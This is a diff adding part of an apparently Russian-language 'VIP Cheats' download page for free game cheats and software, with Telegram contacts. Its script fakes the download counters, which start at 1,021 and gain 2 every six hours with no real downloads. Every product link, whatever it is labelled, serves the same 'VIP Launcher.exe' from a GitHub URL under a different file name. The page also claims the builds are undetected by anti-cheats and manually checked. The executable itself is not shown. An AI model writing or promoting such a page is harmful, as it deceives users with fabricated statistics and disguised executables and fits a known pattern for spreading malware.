+  <div id="sub-other" class="sub-section"><div class="sub-list"><a href="#" data-file="VPN_Ultra">VPN Ultra</a><a href="#" data-file="Optimization_Pack">Optimization Pack</a><a href="#" data-file="BlueStacks_VIP">BlueStacks VIP</a></div></div>
+
+  <div class="features">
+    <div class="feature"><h3 id="f1">Безопасность прежде всего</h3><p id="f1d">Каждая сборка проходит ручную проверку</p></div>
+    <div class="feature"><h3 id="f2">Мгновенный доступ</h3><p id="f2d">Скачивание в пару кликов</p></div>
+    <div class="feature"><h3 id="f3">Круглосуточная поддержка</h3><p id="f3d">Telegram 24/7</p></div>
+    <div class="feature"><h3 id="f4">Быстрые обновления</h3><p id="f4d">Патчи выходят оперативно</p></div>
+    <div class="feature"><h3 id="f5">Абсолютно бесплатно</h3><p id="f5d">Без скрытых платежей</p></div>
+  </div>
+
+  <!-- ЦИТАТА -->
+  <div class="quote" id="quoteText">
+    💜 "Читы — это просто возможность почувствовать кайф от игры. Мы не хотим никому навредить. Просто устали, что люди тратят тысячи на то, что можно получить бесплатно. Играй в кайф, не переплачивай." 💜
+  </div>
+
+  <div style="text-align: center; margin: 3rem 0;">
+    <h2 id="contactTitle">Мы всегда на связи</h2>
+    <div class="buttons">
+      <a href="https://t.me/vipcheatsonly" target="_blank" class="btn btn-telegram"><i class="fab fa-telegram"></i> <span id="tgMain">Telegram @vipcheatsonly</span></a>
+      <a href="https://t.me/besp1atno" target="_blank" class="btn btn-green"><i class="fab fa-telegram"></i> <span id="tgSecond">🎁 ХАЛАВЯЩИК — второй канал</span></a>
+      <a href="https://t.me/managervipcheats" target="_blank" class="btn btn-telegram"><i class="fab fa-telegram"></i> <span id="supportLink">👑 Поддержка @managervipcheats</span></a>
+    </div>
+    <p style="margin-top: 1rem;">📧 info@vipcheats.ru</p>
+  </div>
+
+  <footer>
+    <p id="copyright">© 2026 VIP Cheats — Все права защищены</p>
+  </footer>
+</div>
+
+<script>
+// ========== ТАЙМЕР: КАЖДЫЕ 6 ЧАСОВ +2 СКАЧИВАНИЯ ==========
+let totalDownloads = 1021;
+let todayDownloads = 0;
+
+function loadCounters() {
+  const savedTotal = localStorage.getItem('totalDownloads');
+  const savedToday = localStorage.getItem('todayDownloads');
+  const lastUpdate = localStorage.getItem('lastUpdate');
+  
+  if (savedTotal) totalDownloads = parseInt(savedTotal);
+  else totalDownloads = 1021;
+  
+  if (savedToday) todayDownloads = parseInt(savedToday);
+  else todayDownloads = 0;
+  
+  // Проверяем не прошло ли 6 часов
+  if (lastUpdate) {
+    const hoursPassed = (Date.now() - parseInt(lastUpdate)) / (1000 * 60 * 60);
+    if (hoursPassed >= 6) {
+      const increments = Math.floor(hoursPassed / 6);
+      totalDownloads += increments * 2;
+      todayDownloads += increments * 2;
+      localStorage.setItem('lastUpdate', Date.now().toString());
+    }
+  } else {
+    localStorage.setItem('lastUpdate', Date.now().toString());
+  }
+  
+  updateDisplay();
+}
+
+function updateDisplay() {
+  document.getElementById('totalCount').innerText = totalDownloads;
+  document.getElementById('todayCount').innerText = todayDownloads;
+  localStorage.setItem('totalDownloads', totalDownloads);
+  localStorage.setItem('todayDownloads', todayDownloads);
+}
+
+function incrementCounters() {
+  totalDownloads += 2;
+  todayDownloads += 2;
+  updateDisplay();
+  localStorage.setItem('lastUpdate', Date.now().toString());
+}
+
+// Запускаем таймер: каждые 6 часов прибавляем 2
+setInterval(() => {
+  const lastUpdate = localStorage.getItem('lastUpdate');
+  if (lastUpdate && (Date.now() - parseInt(lastUpdate)) >= (6 * 60 * 60 * 1000)) {
+    incrementCounters();
+  }
+}, 60 * 60 * 1000); // Проверяем каждый час
+
+loadCounters();
+
+// ========== ПЕРЕВОД НА АНГЛИЙСКИЙ ==========
+const translations = {
+  ru: {
+    subtitle: "Скачать читы и софт 2026",
+    stat1: "скачиваний всего",
+    stat2: "скачано сегодня",
+    stat3: "рейтинг (134 отзыва)",
+    badge1: "Undetected античитами",
+    badge2: "Ручная проверка каждой сборки",
+    f1: "Безопасность прежде всего",
+    f1d: "Каждая сборка проходит ручную проверку",
+    f2: "Мгновенный доступ",
+    f2d: "Скачивание в пару кликов",
+    f3: "Круглосуточная поддержка",
+    f3d: "Telegram 24/7",
+    f4: "Быстрые обновления",
+    f4d: "Патчи выходят оперативно",
+    f5: "Абсолютно бесплатно",
+    f5d: "Без скрытых платежей",
+    contactTitle: "Мы всегда на связи",
+    tgMain: "Telegram @vipcheatsonly",
+    tgSecond: "🎁 ХАЛАВЯЩИК — второй канал",
+    supportLink: "👑 Поддержка @managervipcheats",
+    copyright: "© 2026 VIP Cheats — Все права защищены",
+    quote: "💜 \"Cheats are just a way to feel the buzz of the game. We don't want to harm anyone. We're just tired of people spending thousands on what can be obtained for free. Play with pleasure, don't overpay.\" 💜"
+  },
+  en: {
+    subtitle: "Download cheats & software 2026",
+    stat1: "total downloads",
+    stat2: "downloaded today",
+    stat3: "rating (134 reviews)",
+    badge1: "Undetected by anti-cheats",
+    badge2: "Manual check of each build",
+    f1: "Security first",
+    f1d: "Every build is manually checked",
+    f2: "Instant access",
+    f2d: "Download in a few clicks",
+    f3: "24/7 Support",
+    f3d: "Telegram 24/7",
+    f4: "Fast updates",
+    f4d: "Patches arrive quickly",
+    f5: "Completely free",
+    f5d: "No hidden payments",
+    contactTitle: "We are always online",
+    tgMain: "Telegram @vipcheatsonly",
+    tgSecond: "🎁 FREE STUFF — second channel",
+    supportLink: "👑 Support @managervipcheats",
+    copyright: "© 2026 VIP Cheats — All rights reserved",
+    quote: "💜 \"Cheats are just a way to feel the buzz of the game. We don't want to harm anyone. We're just tired of people spending thousands on what can be obtained for free. Play with pleasure, don't overpay.\" 💜"
+  }
+};
+
+let currentLang = 'ru';
+
+function setLanguage(lang) {
+  currentLang = lang;
+  const t = translations[lang];
+  
+  document.getElementById('mainSubtitle').innerText = t.subtitle;
+  document.getElementById('stat1Label').innerText = t.stat1;
+  document.getElementById('stat2Label').innerText = t.stat2;
+  document.getElementById('stat3Label').innerText = t.stat3;
+  document.getElementById('badge1').innerText = t.badge1;
+  document.getElementById('badge2').innerText = t.badge2;
+  document.getElementById('f1').innerText = t.f1;
+  document.getElementById('f1d').innerText = t.f1d;
+  document.getElementById('f2').innerText = t.f2;
+  document.getElementById('f2d').innerText = t.f2d;
+  document.getElementById('f3').innerText = t.f3;
+  document.getElementById('f3d').innerText = t.f3d;
+  document.getElementById('f4').innerText = t.f4;
+  document.getElementById('f4d').innerText = t.f4d;
+  document.getElementById('f5').innerText = t.f5;
+  document.getElementById('f5d').innerText = t.f5d;
+  document.getElementById('contactTitle').innerText = t.contactTitle;
+  document.getElementById('tgMain').innerText = t.tgMain;
+  document.getElementById('tgSecond').innerText = t.tgSecond;
+  document.getElementById('supportLink').innerText = t.supportLink;
+  document.getElementById('copyright').innerHTML = t.copyright;
+  document.getElementById('quoteText').innerHTML = t.quote;
+  
+  document.getElementById('ruBtn').classList.toggle('active', lang === 'ru');
+  document.getElementById('enBtn').classList.toggle('active', lang === 'en');
+}
+
+document.getElementById('ruBtn').onclick = () => setLanguage('ru');
+document.getElementById('enBtn').onclick = () => setLanguage('en');
+setLanguage('ru');
+
+// ========== КЛИК ПО КАРТОЧКАМ ==========
+function hideAllSubs() {
+  document.querySelectorAll('.sub-section').forEach(el => el.classList.remove('active'));
+}
+
+document.querySelectorAll('.game-card').forEach(card => {
+  card.onclick = function(e) {
+    e.stopPropagation();
+    const game = this.getAttribute('data-game');
+    hideAllSubs();
+    const target = document.getElementById(`sub-${game}`);
+    if (target) {
+      target.classList.add('active');
+      target.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+    }
+  };
+});
+
+// ========== СКАЧИВАНИЕ С УВЕЛИЧЕНИЕМ СЧЕТЧИКА ==========
+function addDownload() {
+  totalDownloads += 1;
+  todayDownloads += 1;
+  updateDisplay();
+}
+
+document.addEventListener('click', function(e) {
+  const link = e.target.closest('.sub-list a');
+  if (link) {
+    e.preventDefault();
+    let fileName = link.getAttribute('data-file') || 'VIP_Launcher';
+    fileName = fileName + '.exe';
+    
+    addDownload();
+    
+    const fileUrl = "https://github.com/tapekizaru7-wq/VIP-LAUNCHER/raw/refs/heads/main/VIP%20Launcher.exe";
+    const a = document.createElement('a');
+    a.href = fileUrl;
+    a.download = fileName;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    
+    link.style.background = "#d946ef";
+    setTimeout(() => { link.style.background = ""; }, 300);
+  }
+});
+</script>
+</body>
+</html>
